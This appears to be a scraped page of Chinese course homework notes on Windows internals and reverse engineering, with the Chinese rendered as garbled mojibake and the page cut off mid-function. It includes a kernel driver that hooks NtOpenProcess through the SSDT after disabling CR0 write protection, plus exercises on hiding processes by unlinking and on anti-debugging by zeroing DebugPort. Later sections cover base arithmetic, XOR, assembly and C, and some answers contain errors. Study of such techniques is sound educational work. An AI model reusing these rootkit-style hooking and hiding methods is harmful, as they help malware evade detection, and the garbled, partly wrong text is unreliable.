ç³»ç»ŸæœåŠ¡è¡¨ typedef struct _KSYSTEM_SERVICE_TABLE { PULONG ServiceTableBase;\t// å‡½æ•°åœ°å€è¡¨ PULONG ServiceCounterTableBase;\t// SSDT å‡½æ•°è¢«è°ƒç”¨çš„æ¬¡æ•° ULONG NumberOfService;\t// å‡½æ•°ä¸ªæ•° PULONG ParamTableBase;\t// å‡½æ•°å‚æ•°è¡¨ } KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE; // SSDTè¡¨ typedef struct _KSERVICE_TABLE_DESCRIPTOR { KSYSTEM_SERVICE_TABLE ntoskrnl;\t// å†…æ ¸å‡½æ•° KSYSTEM_SERVICE_TABLE win32k;\t// win32k.sys å‡½æ•° KSYSTEM_SERVICE_TABLE unUsed1; KSYSTEM_SERVICE_TABLE unUsed2; } KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR; // NTOPENPROCESS typedef NTSTATUS (*NTOPENPROCESS) (PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId); /************************************************************************/ /* å‡½æ•°å£°æ˜ */ /************************************************************************/ VOID DriverUnload(PDRIVER_OBJECT pDriver); NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path); VOID PageProtectOff(); VOID PageProtectOn(); VOID HookNtOpenProcess(); VOID UnHookNtOpenProcess(); NTSTATUS HbgNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId); /************************************************************************/ /* å…¨å±€å˜é‡ */ /************************************************************************/ extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; // ntoskrnl.exe å¯¼å‡ºçš„å…¨å±€å˜é‡ ULONG uOldNtOpenProcess; // æ—§çš„å‡½æ•°åœ°å€ /************************************************************************/ /* å‡½æ•°å®šä¹‰ */ /************************************************************************/ // é©±åŠ¨å…¥å£ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path) { // HOOK HookNtOpenProcess(); pDriver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } // å¸è½½é©±åŠ¨ VOID DriverUnload(PDRIVER_OBJECT pDriver) { UnHookNtOpenProcess(); DbgPrint(\"Driver unloaded.\\n\"); } // å…³é—­é¡µä¿æŠ¤ VOID PageProtectOff() { __asm { cli; // å…³é—­ä¸­æ–­ mov eax, cr0; and eax, not 0x10000; // WPä½ç½®0 mov cr0, eax; } } // å¼€å¯é¡µä¿æŠ¤ VOID PageProtectOn() { __asm { mov eax, cr0; or eax, 0x10000; // WPä½ç½®1 mov cr0, eax; sti; // æ¢å¤ä¸­æ–­ } } // HOOK NtOpenProcess VOID HookNtOpenProcess() { PageProtectOff(); uOldNtOpenProcess = KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A]; KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A] = (ULONG)HbgNtOpenProcess; PageProtectOn(); } // UnHOOK NtOpenProcess VOID UnHookNtOpenProcess() { PageProtectOff(); KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A] = uOldNtOpenProcess; PageProtectOn(); } // è¢«ä¿®æ”¹çš„ NtOpenProcess å‡½æ•°ï¼Œç®€å•æ‰“å°å‚æ•° NTSTATUS HbgNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { DbgPrint(\"%x %x %x %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); return ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); } è¿›ç¨‹ä¸çº¿ç¨‹ 01 æ–­é“¾è¿›ç¨‹ç»“æ„ä½“ï¼Œå®ç°éšè—ï¼Œå¹¶æ€è€ƒä¸ºä»€ä¹ˆæ–­é“¾è¿›ç¨‹ä¸ºä»€ä¹ˆè¿˜èƒ½å¤Ÿæ‰§è¡Œã€‚\nFailed to get VadRoot PROCESS 89512978 SessionId: 0 Cid: 0684 Peb: 7ffd5000 ParentCid: 0580 DirBase: 10240220 ObjectTable: e1778238 HandleCount: 85. Image: ctfmon.exe Failed to get VadRoot PROCESS 8944d640 SessionId: 0 Cid: 0710 Peb: 7ffdb000 ParentCid: 0580 DirBase: 10240260 ObjectTable: e26f6560 HandleCount: 50. Image: notepad.exe Failed to get VadRoot PROCESS 897d36e8 SessionId: 0 Cid: 07a8 Peb: 7ffdb000 ParentCid: 0298 DirBase: 102401a0 ObjectTable: e22ba310 HandleCount: 60. Image: VGAuthService.exe ä½¿ç”¨DebugPortæ¸…é›¶å®ç°åè°ƒè¯•ã€‚\n05 åˆ†æKiSwapContextå‡½æ•°ï¼š\nSwapContextæœ‰å‡ ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\nä¸‰ä¸ªï¼Œint *a1@\u003cebx\u003e, int a2@\u003cedi\u003e, int a3@\u003cesi\u003e\nSwapContextåœ¨å“ªé‡Œå®ç°äº†çº¿ç¨‹åˆ‡æ¢ï¼Ÿ\nåˆ‡æ¢espå°±æ˜¯åˆ‡æ¢çº¿ç¨‹äº†ï¼š\n.text:0040498F loc_40498F: ; CODE XREF: SwapContext+66â†‘j .text:0040498F mov ecx, [ebx+40h] .text:00404992 mov [ecx+4], eax .text:00404995 mov esp, [esi+28h] .text:00404998 mov eax, [esi+20h] .text:0040499B mov [ebx+18h], eax çº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™ï¼Œä¼šåˆ‡æ¢Cr3å—ï¼Ÿåˆ‡æ¢Cr3çš„æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ\n.text:0040499F mov eax, [edi+44h] .text:004049A2 cmp eax, [esi+44h] .text:004049A5 mov byte ptr [edi+50h], 0 .text:004049A9 jz short loc_4049D7 å¦‚æœ[edi+44h] != [esi+44h]å°±åˆ‡æ¢cr3 ä¸­æ–­é—¨ææƒæ—¶ï¼ŒCPUä¼šä»TSSå¾—åˆ°ESP0å’ŒSS0ï¼ŒTSSä¸­å­˜å‚¨çš„ä¸€å®šæ˜¯å½“å‰çº¿ç¨‹çš„ESP0å’ŒSS0å—ï¼Ÿå¦‚ä½•åšåˆ°çš„ï¼Ÿ\nFS:[0]åœ¨3ç¯æ—¶æŒ‡å‘TEBä½†æ˜¯çº¿ç¨‹æœ‰å¾ˆå¤šï¼ŒFS:[0]æŒ‡å‘çš„æ˜¯å“ªä¸ªçº¿ç¨‹çš„TEBå¦‚ä½•åšåˆ°çš„ï¼Ÿ\n0ç¯çš„ExceptionListåœ¨å“ªé‡Œå¤‡ä»½çš„?\nIdleThreadæ˜¯ä»€ä¹ˆï¼Ÿä»€ä¹ˆæ—¶å€™æ‰§è¡Œï¼Ÿå¦‚ä½•æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Ÿ\nåˆ†æKiFindReadyThreadï¼ŒæŸ¥çœ‹æ˜¯æ€æ ·æŸ¥æ‰¾å°±ç»ªçº¿ç¨‹çš„ã€‚\næ¨¡æ‹Ÿçº¿ç¨‹åˆ‡æ¢ä¸Windowsçš„çº¿ç¨‹åˆ‡æ¢æœ‰å“ªäº›åŒºåˆ«?\nèµ°ä¸€éæ—¶é’Ÿä¸­æ–­æµç¨‹ï¼Œåˆ†æKeUpdateRunTineå‡½æ•°ã€‚"},"title":"Homework"},"/docs/homework/homeworkbas/":{"data":{"":"","#":"è¿›åˆ¶ ç¼–åˆ¶7è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š23456+54356=ï¼Ÿ5621-654=ï¼Ÿ234*65=ï¼Ÿ\n7è¿›åˆ¶ 1+1 =2 1+2 =3 2+2 =4 1+3 =4 2+3 =5 3+3 =6 1+4 =5 2+4 =6 3+4 =10 4+4 =11 1+5 =6 2+5 =10 3+5 =11 4+5 =12 5+5 =13 1+6 =10 2+6 =11 3+6 =12 4+6 =13 5+6 =14 6+6 =15 7è¿›åˆ¶ 1*1 =1 1*2 =2 2*2 =4 1*3 =3 2*3 =6 3*3 =12 1*4 =4 2*4 =11 3*4 =15 4*4 =22 1*5 =5 2*5 =13 3*5 =21 4*5 =26 5*5 =34 1*6 =6 2*6 =15 3*6 =24 4*6 =33 5*6 =42 6*6 =51 23456 + 54356 = 111145 23456 + 54356 --------- 111145 5621 - 654 = 4634 5621 - 654 -------- 4634 234 * 65 = 12566 234 * 65 ------- 1536 2103 ------- 12566 ç¼–åˆ¶16è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœï¼š2D4E6+CF3A6=ï¼Ÿ5FD1-E5A=ï¼Ÿ2CA*A5=ï¼Ÿ\n16è¿›åˆ¶ 1+1 =2 1+2 =3 2+2 =4 1+3 =4 2+3 =5 3+3 =6 1+4 =5 2+4 =6 3+4 =7 4+4 =8 1+5 =6 2+5 =7 3+5 =8 4+5 =9 5+5 =A 1+6 =7 2+6 =8 3+6 =9 4+6 =A 5+6 =B 6+6 =C 1+7 =8 2+7 =9 3+7 =A 4+7 =B 5+7 =C 6+7 =D 1+8 =9 2+8 =A 3+8 =B 4+8 =C 5+8 =D 6+8 =E 1+9 =A 2+9 =B 3+9 =C 4+9 =D 5+9 =E 6+9 =F 1+A =B 2+A =C 3+A =D 4+A =E 5+A =F 6+A =10 1+B =C 2+B =D 3+B =E 4+B =F 5+B =10 6+B =11 1+C =D 2+C =E 3+C =F 4+C =10 5+C =11 6+C =12 1+D =E 2+D =F 3+D =10 4+D =11 5+D =12 6+D =13 1+E =F 2+E =10 3+E =11 4+E =12 5+E =13 6+E =14 1+F =10 2+F=11 3+F =12 4+F =13 5+F =14 6+F =15 16è¿›åˆ¶ 1*1 =1 1*2 =2 2*2 =4 1*3 =3 2*3 =6 3*3 =9 1*4 =4 2*4 =8 3*4 =C 4*4 =10 1*5 =5 2*5 =A 3*5 =F 4*5 =14 5*5 =19 1*6 =6 2*6 =C 3*6 =12 4*6 =18 5*6 =1E 6*6 =24 1*7 =7 2*7 =E 3*7 =15 4*7 =1C 5*7 =23 6*7 =2A 1*8 =8 2*8 =10 3*8 =18 4*8 =20 5*8 =28 6*8 =30 1*9 =9 2*9 =12 3*9 =1B 4*9 =24 5*9 =2D 6*9 =36 1*A =A 2*A =14 3*A =1E 4*A =28 5*A =32 6*A =3C 1*B =B 2*B =16 3*B =21 4*B =2C 5*B =37 6*B =42 1*C =C 2*C =18 3*C =24 4*C =30 5*C =3C 6*C =48 1*D =D 2*D =1A 3*D =27 4*D =34 5*D =41 6*D =4E 1*E =E 2*E =1C 3*E =27 4*E =38 5*E =46 6*E =54 1*F =F 2*F=1E 3*F =2D 4*F =3C 5*F =4B 6*F =5A 2D4E6 + CF3A6 = 0xfc88c 5FD1 - E5A = 0x5177 2CA * A5 = 0x1cc32 9è¿›åˆ¶å®šä¹‰ï¼šç”±9ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š2ã€9ã€1ã€7ã€6ã€5ã€4ã€8ã€3ï¼Œé€¢9è¿›1ï¼Œè®¡ç®—ï¼š123 + 234 = ?\nâ€‹ 0ã€1ã€2ã€3ã€4ã€5ã€6ã€7ã€8\nå…ˆè½¬ä¸ºä¸€èˆ¬9è¿›åˆ¶ï¼š208 + 086\n208 + 086 ------- 305 è½¬ä¸ºå®šä¹‰çš„9è¿›åˆ¶ï¼š725\n10è¿›åˆ¶å®šä¹‰ï¼šç”±10ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š!ã€@ã€$ã€%ã€^ã€\u0026ã€*ã€Aã€Bã€Cï¼Œé€¢10è¿›1ï¼Œè®¡ç®—ï¼š@$$B + %AC\u0026 = ?\nâ€‹ 0ã€1ã€2ã€3ã€4ã€5ã€6ã€7ã€8ã€9\nè½¬ä¸ºä¸€èˆ¬10è¿›åˆ¶å¹¶è®¡ç®—ï¼š1228 + 3795 = 5023\nè½¬ä¸ºå®šä¹‰çš„10è¿›åˆ¶ï¼š\u0026!$%\nä½¿ç”¨å¼‚æˆ–å¯¹87AD6è¿›è¡ŒåŠ å¯†åå†è¿›è¡Œè§£å¯†ï¼ŒåŠ è§£å¯†å¯†é’¥ï¼š5\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e char xor_with_key(char data, char key) { int hex_value = (data \u003e= '0' \u0026\u0026 data \u003c= '9') ? data - '0' : data - 'A' + 10; int xor_result = hex_value ^ key; return (xor_result \u003c 10) ? (xor_result + '0') : (xor_result - 10 + 'A'); } void encrypt_decrypt(char *input, char key) { for (int i = 0; i \u003c strlen(input); i++) { input[i] = xor_with_key(input[i], key); } } int main() { char input[] = \"87AD6\"; char key = 5; // XOR key printf(\"Original: %s\\n\", input); // Encrypt encrypt_decrypt(input, key); printf(\"Encrypted: %s\\n\", input); // Decrypt encrypt_decrypt(input, key); printf(\"Decrypted (Original): %s\\n\", input); return 0; } é€»è¾‘è¿ç®— å…«è¿›åˆ¶æ•°2-5åœ¨è®¡ç®—å™¨ä¸­çš„çš„ç»“æœæ˜¯ï¼š1777777777777777777775ä¸ºä»€ä¹ˆï¼Ÿ\nç®—æ˜¯è´Ÿæ•°æº¢å‡ºäº†\nåªç”¨é€»è¾‘è¿ç®—è®¡ç®—2-3=ï¼Ÿï¼ˆæ¶‰åŠå†…å®¹ï¼šé€»è¾‘è¿ç®—ã€ç§»ä½ã€æ•°æ®å®½åº¦ï¼‰\n2+(-3) 0010 1101 xor----------- 1111 rï¼š1111 0010 1101 and----------- 0000 rï¼š0000 result ==1111 = -1 å †æ ˆæ“ä½œ ä½¿ç”¨EBXå­˜å‚¨æ ˆåº•åœ°å€ï¼ŒEDXå­˜å‚¨æ ˆé¡¶åœ°å€ï¼Œè¿ç»­å­˜å‚¨5ä¸ªä¸åŒçš„æ•°\nmov edx,esp mov eax,11111111 mov dword ptr ss:[edx],eax sub edx,4 â†‘x5 åˆ†åˆ«ä½¿ç”¨æ ˆåº•åŠ åç§»ã€æ ˆé¡¶åŠ åç§»çš„æ–¹å¼è¯»å–è¿™5ä¸ªæ•°ï¼Œå¹¶å­˜å‚¨åˆ°å¯„å­˜å™¨ä¸­\nmov eax,dword ptr ss:[edx+4] mov eax,dword ptr ss:[ebx-4] å¼¹å‡ºè¿™5ä¸ªæ•°ï¼Œæ¢å¤æ ˆé¡¶åˆ°åŸæ¥çš„ä½ç½®\npop eax â†‘x5 mov ebx,dword ptr ss:[ebx+0x4*5] ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špush ecx\nsub esp,4 mov dword ptr ss:[esp],ecx mov esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],ecx ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špop ecx\nmov ecx,dword ptr ss:[esp] add esp,4 mov ecx,dword ptr ss:[esp] mov esp,dword ptr ss:[esp+4] ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špush esp\nsub esp,4 mov dword ptr ss:[esp],esp mov dword ptr ss:[esp-4],esp lea esp,dword ptr ss:[esp-4] ä½¿ç”¨2ç§æ–¹å¼å®ç°ï¼špop esp\nadd esp,4 mov esp,dword ptr ss:[esp-4] lea esp,dword ptr ss:[esp+4] mov esp,dword ptr ss:[esp-4] æ ‡å¿—å¯„å­˜å™¨ å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“CFä½çš„å€¼ï¼ˆä¸èƒ½å½±å“å…¶ä»–æ ‡å¿—ä½ï¼‰\nmov ax,0xf000 add ax,0x1000 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“PFä½çš„å€¼ï¼ˆä¸èƒ½å½±å“å…¶ä»–æ ‡å¿—ä½ï¼‰\nMOV ax,0x3 add ax,0xC0 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“AFä½çš„å€¼ï¼ˆä¸èƒ½å½±å“å…¶ä»–æ ‡å¿—ä½)\nmov ax,0xf0 add ax,0x10 å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“SFä½çš„å€¼ï¼ˆä¸èƒ½å½±å“å…¶ä»–æ ‡å¿—ä½ï¼‰\nMOV ax,0x8000 add ax,0xc å†™æ±‡ç¼–æŒ‡ä»¤åªå½±å“OFä½çš„å€¼ï¼ˆä¸èƒ½å½±å“å…¶ä»–æ ‡å¿—ä½ï¼‰\nMOV AL,0x80 SUB AL,0x10 ç”¨MOVSæŒ‡ä»¤åˆ†åˆ«ç§»åŠ¨5ä¸ªå­—èŠ‚ã€5ä¸ªå­—ã€5ä¸ªåŒå­—\nMOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI] MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI] MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI] ç”¨STOSæŒ‡ä»¤åˆ†åˆ«å­˜å‚¨5ä¸ªå­—èŠ‚ã€5ä¸ªå­—ã€5ä¸ªåŒå­—\nSTOS BYTE PTR ES:[EDI] STOS WORD PTR ES:[EDI] STOS DWORD PTR ES:[EDI] ä½¿ç”¨REPæŒ‡ä»¤é‡å†™ä¸Šé¢ä¸¤é¢˜\nMOV ECX,5 REP MOVSD REP STOSD JCC CALLæ‰§è¡Œæ—¶å †æ ˆæœ‰ä»€ä¹ˆå˜åŒ–ï¼ŸEIPæœ‰å˜åŒ–å—ï¼Ÿ\nå°†callä¸‹ä¸€è¡Œä»£ç çš„åœ°å€pushè¿›æ ˆï¼Œç„¶åå°†eipè·³åˆ°è¦callçš„åœ°å€å¤„\nRETæ‰§è¡Œæ—¶å †æ ˆæœ‰ä»€ä¹ˆå˜åŒ–ï¼ŸEIPæœ‰å˜åŒ–å—ï¼Ÿ\nå°†æ ˆé¡¶çš„å€¼popç»™eipï¼Œè¿™ä¸ªå€¼æ˜¯ä¹‹å‰callæ—¶çš„ä¸‹ä¸€è¡Œçš„åœ°å€\nä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬\nä¸å…è®¸åœ¨ODä¸­é€šè¿‡åŒå‡»çš„å½¢å¼ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨\nè¦é€šè¿‡æ±‡ç¼–æŒ‡ä»¤çš„æ‰§è¡Œå»å½±å“æ ‡å¿—ä½ï¼Œèƒ½ç”¨CMPå’ŒTESTå®ç°çš„ä¼˜å…ˆè€ƒè™‘\n1ã€\tJE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬)\tZF=1 mov eax,0x1337 mov ecx,0x1337 cmp eax,ecx jz 0x00400000 2ã€\tJNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0 mov eax,0x1337 test eax,eax jnz 0x00400000 3ã€\tJS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬\tSF=1 mov eax,0x100 mov ecx,0x200 cmp eax,ecx js 0x00401045 4ã€\tJNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬\tSF=0 mov eax,0x100 mov ecx,0x200 cmp ecx,eax js 0x00401045 5ã€\tJP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬\tPF=1 mov eax,0x100 mov ecx,0x200 cmp ecx,eax jp 0x4010B2 6ã€\tJNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬\tPF=0 mov eax,0x101 mov ecx,0x100 cmp eax,ecx jpo 0x40101C 7ã€\tJO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬\tOF=1 8ã€\tJNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬\tOF=0 9ã€\tJB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=1 10ã€\tJNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=0 11ã€\tJBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)\tCF=1 or ZF=1 12ã€\tJNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°)\tCF=0 and ZF=0 13ã€\tJL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tSFâ‰  OF 14ã€\tJNL, JGE å¤§äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tSF=OF 15ã€\tJLE, JNG å°äºç­‰äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°)\tZF=1 or SFâ‰  OF 16ã€\tJNLE, JG å¤§äºåˆ™è·³è½¬(æœ‰ç¬¦å·æ•°)\tZF=0 and SF=OF å †æ ˆå›¾ 0x401174\n0x401182\n0x40118E\nc ç¼–å†™ä¸€ä¸ªå‡½æ•°èƒ½å¤Ÿå¯¹ä»»æ„2ä¸ªæ•´æ•°å®ç°åŠ æ³•,å¹¶åˆ†æå‡½æ•°çš„åæ±‡ç¼–\nint Plus1(int x,int y) { return x+y; } 0000000000001129 \u003cPlus1\u003e: 1129:\tf3 0f 1e fa endbr64 112d:\t55 push rbp 112e:\t48 89 e5 mov rbp,rsp 1131:\t89 7d fc mov DWORD PTR [rbp-0x4],edi ;ç¬¬ä¸€ä¸ªå‚æ•° 1134:\t89 75 f8 mov DWORD PTR [rbp-0x8],esi ;ç¬¬äºŒä¸ªå‚æ•° 1137:\t8b 55 fc mov edx,DWORD PTR [rbp-0x4] 113a:\t8b 45 f8 mov eax,DWORD PTR [rbp-0x8] 113d:\t01 d0 add eax,edx ;æ“ä½œè¿‡ç¨‹ 113f:\t5d pop rbp 1140:\tc3 ret ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå¯¹ä»»æ„3ä¸ªæ•´æ•°å®ç°åŠ æ³•,å¹¶åˆ†æå‡½æ•°çš„åæ±‡ç¼–\nint Plus2(int x,int y,int z) { return x+y+z; } 0000000000001129 \u003cPlus2\u003e: 1129:\tf3 0f 1e fa endbr64 112d:\t55 push rbp 112e:\t48 89 e5 mov rbp,rsp 1131:\t89 7d fc mov DWORD PTR [rbp-0x4],edi ;ç¬¬ä¸€ä¸ªå‚æ•° 1134:\t89 75 f8 mov DWORD PTR [rbp-0x8],esi ;ç¬¬äºŒä¸ªå‚æ•° 1137:\t89 55 f4 mov DWORD PTR [rbp-0xc],edx ;ç¬¬ä¸‰ä¸ªå‚æ•° 113a:\t8b 55 fc mov edx,DWORD PTR [rbp-0x4] 113d:\t8b 45 f8 mov eax,DWORD PTR [rbp-0x8] 1140:\t01 c2 add edx,eax ;æ˜¯å‰ä¸¤ä¸ªå‚æ•°å…ˆç›¸åŠ  1142:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] 1145:\t01 d0 add eax,edx ;ä¹‹åä¸ç¬¬å››ä¸ªå‚æ•°ç›¸åŠ  1147:\t5d pop rbp 1148:\tc3 ret ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°å¯¹ä»»æ„5ä¸ªæ•´æ•°å®ç°åŠ æ³•ï¼ˆä½¿ç”¨Plus1å’ŒPlus2ï¼‰å¹¶åˆ†æä¸€ä¸ªå‡½æ•°çš„åæ±‡ç¼–ä»£ç \nint Plus3(int a,int b,int c,int d,int e) { return Plus2(a,b,c)+Plus1(d,e); } 0000000000001161 \u003cPlus3\u003e: 1161:\tf3 0f 1e fa endbr64 1165:\t55 push rbp 1166:\t48 89 e5 mov rbp,rsp 1169:\t53 push rbx 116a:\t48 83 ec 18 sub rsp,0x18 116e:\t89 7d f4 mov DWORD PTR [rbp-0xc],edi 1171:\t89 75 f0 mov DWORD PTR [rbp-0x10],esi 1174:\t89 55 ec mov DWORD PTR [rbp-0x14],edx 1177:\t89 4d e8 mov DWORD PTR [rbp-0x18],ecx 117a:\t44 89 45 e4 mov DWORD PTR [rbp-0x1c],r8d 117e:\t8b 55 ec mov edx,DWORD PTR [rbp-0x14] ;å‚æ•°3 1181:\t8b 4d f0 mov ecx,DWORD PTR [rbp-0x10] ;å‚æ•°2 1184:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] ;å‚æ•°1 1187:\t89 ce mov esi,ecx 1189:\t89 c7 mov edi,eax 118b:\te8 b1 ff ff ff call 1141 \u003cPlus2\u003e ;è°ƒç”¨å‡½æ•° 1190:\t89 c3 mov ebx,eax 1192:\t8b 55 e4 mov edx,DWORD PTR [rbp-0x1c] 1195:\t8b 45 e8 mov eax,DWORD PTR [rbp-0x18] 1198:\t89 d6 mov esi,edx ;å‚æ•°1 119a:\t89 c7 mov edi,eax ;å‚æ•°2 119c:\te8 88 ff ff ff call 1129 \u003cPlus1\u003e ;è°ƒç”¨å‡½æ•° 11a1:\t01 d8 add eax,ebx 11a3:\t48 8b 5d f8 mov rbx,QWORD PTR [rbp-0x8] 11a7:\tc9 leave 11a8:\tc3 ret æ•°æ®ç±»å‹ å®šä¹‰4ä¸ªintç±»å‹çš„å…¨å±€å˜é‡ï¼Œåˆ†åˆ«æ˜¯g_x,g_y,g_z,g_rï¼Œä½¿ç”¨if..else..åˆ†æ”¯è¯­å¥ï¼Œå°†æœ€å¤§çš„å€¼å­˜å‚¨åˆ°g_rä¸­\nint g_x = 5; int g_y = 4; int g_z = 7; int g_r = 0; void Max() { if (g_x \u003e= g_y \u0026\u0026 g_x \u003e= g_z) { g_r = g_x; // g_x æœ€å¤§ } else if (g_y \u003e= g_x \u0026\u0026 g_y \u003e= g_z) { g_r = g_y; // g_y æœ€å¤§ } else { g_r = g_z; // g_z æœ€å¤§ } } æ‰¾å‡ºæ•°ç»„é‡Œé¢æœ€å¤§çš„å€¼ï¼Œå¹¶å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ï¼ˆif..esleï¼‰\nint arr[4] = {2,5,7,9}; int g_r; void ArrMax() { if (arr[0] \u003e= arr[1] \u0026\u0026 arr[0] \u003e= arr[2] \u0026\u0026 arr[0]\u003e=arr[3]) { g_r = arr[0]; // arr[0] æœ€å¤§ } else if (arr[1] \u003e= arr[0] \u0026\u0026 arr[1] \u003e= arr[2] \u0026\u0026 arr[1]\u003e=arr[3]) { g_r = arr[1]; // arr[1] æœ€å¤§ } else if (arr[2] \u003e= arr[0] \u0026\u0026 arr[2] \u003e= arr[1] \u0026\u0026 arr[2]\u003e=arr[3]) { g_r = arr[2]; // arr[2] æœ€å¤§ } else{ g_r = arr[3]; // arr[3] æœ€å¤§ } } å°†æ•°ç»„æ‰€æœ‰çš„å…ƒç´ ç›¸åŠ ï¼Œå°†ç»“æœå­˜å‚¨åˆ°g_rä¸­\nint arr[10] = {2,5,7,9,22,4,8,22,3,18}; int g_r; void ArrMax() { for (int i = 0; i \u003c 10; i++) { g_r += arr[i]; } } ä¿©ä¿©æ¯”è¾ƒæ•°ç»„çš„å€¼ï¼Œå°†æœ€å¤§çš„ä¸€ä¸ªå­˜å‚¨åˆ°æ•°ç»„çš„æœ€åä¸€ä¸ªä½ç½®ï¼ˆè¦æ±‚ä½¿ç”¨forå¾ªç¯å®ç°ï¼‰\nint arr[10] = {2,7,5,9,22,4,8,22,3,18}; int g_r; void ArrMax() { for (int i = 0; i \u003c 10; i++) { if(g_r \u003c= arr[i]){ g_r = arr[i]; } } arr[9] = g_r; } æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯è¿™æ ·çš„ï¼šchinaä¸­å›½verygoodå¤©æœniceï¼Œé‡Œé¢æ—¢å«æœ‰ä¸­æ–‡åˆå«ä¹‰è‹±æ–‡ï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½æˆªå–ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²nï¼ˆn\u003c=æ€»é•¿åº¦ï¼‰\nchar* fn(int n) { const char* str = \"chinaä¸­å›½verygoodå¤©æœnice\"; int len = strlen(str); // è·å–å­—ç¬¦ä¸²çš„æ€»é•¿åº¦ int count = 0; // ç”¨äºè®¡æ•°æœ‰æ•ˆå­—ç¬¦æ•° int i; // ä¸ºè¾“å‡ºå­—ç¬¦ä¸²åˆ†é…è¶³å¤Ÿçš„å†…å­˜ char* output = (char*)malloc((n + 1) * sizeof(char)); if (output == NULL) { return NULL; // å†…å­˜åˆ†é…å¤±è´¥ } // éå†åŸå§‹å­—ç¬¦ä¸² for (i = 0; i \u003c len \u0026\u0026 count \u003c n; i++) { // åˆ¤æ–­å½“å‰å­—ç¬¦æ˜¯å¦ä¸ºä¸­æ–‡ if ((str[i] \u0026 0x80) != 0) { // å¦‚æœé«˜ä½ä¸º1ï¼Œåˆ™ä¸ºä¸­æ–‡å­—ç¬¦ // ä¸­æ–‡å­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ if (count + 1 \u003c n) { output[count++] = str[i++]; output[count++] = str[i]; // å¤åˆ¶ä¸­æ–‡å­—ç¬¦çš„ç¬¬äºŒä¸ªå­—èŠ‚ } } else { // è‹±æ–‡å­—ç¬¦å ç”¨ä¸€ä¸ªå­—èŠ‚ output[count++] = str[i]; } } // 